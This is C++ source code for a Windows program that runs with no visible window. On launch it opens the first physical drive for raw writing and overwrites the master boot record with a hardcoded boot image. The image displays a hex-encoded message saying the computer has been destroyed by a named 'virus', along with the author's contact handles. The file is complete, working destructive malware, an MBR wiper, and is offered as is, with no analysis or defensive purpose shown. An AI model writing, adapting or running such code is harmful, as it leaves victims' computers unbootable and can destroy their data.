#include <windows.h>
#include <iostream>
#include <ctime>
#include <string>
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )   
using namespace std;
#define mbrsize 1024
#define boot "\xFC\x31\xC0\x8E\xD0\xBC\x00\x7C\xB8\x00\x80\x8E\xC0\x8E\xD8\xB8\x06\x02\xB9\x01\x00\xB6\x00\xBB\x00\x00\xCD\x13\x80\xFC\x00\x75\xEE\x88\x16\x79\x00\x06\xB8\x2B\x00\x50\xCB\xB9\x07\x26\xB4\x01\xB7\x00\xCD\x10\xB8\x03\x10\xB3\x00\xCD\x10\xB4\x07\xB0\x00\xB7\x0C\xB9\x00\x00\xBA\x4F\x18\xCD\x10\xB6\x00\xB2\x00\xB4\x02\xB7\x00\xCD\x10\xBD\x00\x02\xB4\x0E\xBE\xFF\xFF\x46\x3E\x80\x3A\x00\x74\x0D\x55\x3E\x8A\x42\x00\xBB\x07\x00\xCD\x10\x5D\xEB\xEC\xF4\xB4\x86\xB9\x32\x00\xCD\x15\xEB\xF6\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x55\xAA\x59\x6F\x75\x72\x20\x63\x6F\x6D\x70\x75\x74\x65\x72\x20\x68\x61\x73\x20\x62\x65\x65\x6E\x20\x64\x65\x73\x74\x72\x6F\x79\x65\x64\x20\x62\x79\x20\x58\x55\x47\x45\x27\x73\x20\x41\x6E\x64\x72\x6F\x69\x64\x20\x49\x63\x6F\x6E\x20\x56\x69\x72\x75\x73\x21\x0D\x0A\x49\x66\x20\x79\x6F\x75\x20\x77\x61\x6E\x74\x20\x74\x6F\x20\x6B\x6E\x6F\x77\x20\x68\x6F\x77\x20\x74\x6F\x20\x72\x65\x70\x61\x69\x72\x20\x79\x6F\x75\x72\x20\x63\x6F\x6D\x70\x75\x74\x65\x72\x20\x2C\x20\x70\x6C\x65\x61\x73\x65\x20\x63\x6F\x6E\x74\x61\x63\x74\x20\x74\x68\x65\x20\x77\x72\x69\x74\x65\x72\x2E\x0D\x0A\x0D\x0A\x51\x51\x3A\x32\x32\x30\x31\x31\x38\x35\x33\x37\x33\x0D\x0A\x44\x69\x6E\x67\x74\x61\x6C\x6B\x3A\x31\x70\x67\x5F\x72\x72\x6F\x77\x70\x65\x30\x30\x62\x61\x0D\x0A\x68\x74\x74\x70\x73\x3A\x2F\x2F\x73\x70\x61\x63\x65\x2E\x62\x69\x6C\x69\x62\x69\x6C\x69\x2E\x63\x6F\x6D\x2F\x31\x37\x34\x31\x37\x38\x30\x36\x30\x33\x0D\x0A\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x69\x78\x69\x67\x75\x61\x2E\x63\x6F\x6D\x2F\x68\x6F\x6D\x65\x2F\x33\x30\x37\x34\x36\x38\x32\x32\x38\x32\x30\x34\x39\x37\x39\x36\x0D\x0A\x0D\x0A\x43\x72\x65\x61\x74\x65\x64\x20\x62\x79\x20\x58\x55\x47\x45\x0D\x0A\x43\x6F\x70\x79\x72\x69\x67\x68\x74\x20\x32\x30\x31\x39\x7E\x32\x30\x32\x34\x20\x58\x55\x47\x45\x20\x53\x74\x75\x64\x69\x6F\x73\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"            
int killmbr()
{
	BYTE pmbr[1024] = { 0 };
	DWORD write;
	HANDLE mbr;
	char mbrdata[mbrsize] = boot;
	memcpy(pmbr, mbrdata, sizeof(mbrdata) - 1);
	pmbr[510] = 0x55;
	pmbr[511] = 0xAA;           
	mbr = CreateFile
	(
		"\\\\.\\PHYSICALDRIVE0",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
	);
	if (WriteFile(mbr, pmbr, sizeof(pmbr), &write, NULL) == TRUE)
	{
	}
	else
	{
	}
	CloseHandle(mbr);
	return EXIT_SUCCESS;
}
int main()
{
	killmbr();     
	return 0;
}